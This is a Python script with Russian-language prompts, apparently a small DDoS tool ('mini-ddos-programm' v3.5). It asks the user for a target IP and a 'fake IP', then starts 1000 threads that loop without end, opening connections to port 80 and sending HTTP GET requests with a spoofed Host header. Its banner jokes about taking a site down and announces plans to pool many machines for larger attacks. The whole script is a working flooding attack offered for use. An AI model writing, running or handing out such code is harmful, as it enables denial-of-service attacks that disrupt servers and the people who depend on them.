import os
print('Установка дополнительных модулей...')
os.system('pip install requests')
os.system('pip install colorama')
print('Импортирую модули...')
import colorama
import socket
import requests
import threading
import time
print('Импортирую цвета...')
from colorama import Fore
colorama.init()
print('Запуск программы...')
version = 'v3.5'
print(version)
print(Fore.GREEN + 'created bySKATT')
time.sleep(1)

print(Fore.YELLOW + 'Проверка Обновлений')
VERSION_URL = 'https://api.github.com/repos/POHel/mini-ddos-programm/releases/latest'
DOWNLOAD_URL = 'https://github.com/POHel/mini-ddos-programm/archive/refs/tags/v3.5.zip'

def update_program(owner, repo, file):
    response = requests.get(VERSION_URL.format(owner=owner, repo=repo)).json()
    latest_version = response['tag_name']

    if latest_version != version:
        print(Fore.YELLOW + '!!!Доступно обновление!!!')
        download_url = DOWNLOAD_URL.format(owner=owner, repo=repo, file=file)
        r = requests.get(download_url, allow_redirects=True)
        open(file, 'wb').write(r.content)

    if latest_version == version:
        print(Fore.GREEN + 'Установлена самая последняя версия')

if __name__ == '__main__':
    update_program('POHel', 'mini-ddos-programm', 'v3.5.zip')
time.sleep(1)

print(Fore.BLUE + 'Определяю OS...')
time.sleep(1)
print('Ваша ос: ', os.name)
time.sleep(3)
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
print(Fore.GREEN + 'created bySKATT')
print(Fore.BLUE + 'Ваша ос: ', os.name)
print(version)
print(Fore.YELLOW + '''
    !О БУДУЮЩИХ ОБНОВЛЕНИЯХ!
    В 4 версии хочу добавить пинг чтобы сразу в программе можно было проверить статус IP
    В 5 версии хочу сделать сервера и клиента для автоматизации запуска программы на всех имеющихся у вас машинах 
    (чтобы суммировать вычислительную мощность)
    А дальше можете предложить свою идею
''')
print(Fore.RED + '''
    Если возникают ошибки, то вот возможные причины:
    1)Плохое соединение с интернетом
    2)Некорректно введён IP адрес
    3)Сервер не может обработать ваши звпросы
    (это хорошо, кто не знает это означает что сервер начал лагать или же это 1 пункт)
    4)Возможно вы положили сайт :)
    (но это не точно)
''')
print(Fore.GREEN + '')
ip = input('введите IP: ')
fip = input('введите fake IP: ')
target = ip
fake_ip = fip
port = 80
attack_num = 1

def attack():
    print(Fore.WHITE + '')
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                                
        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()
for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
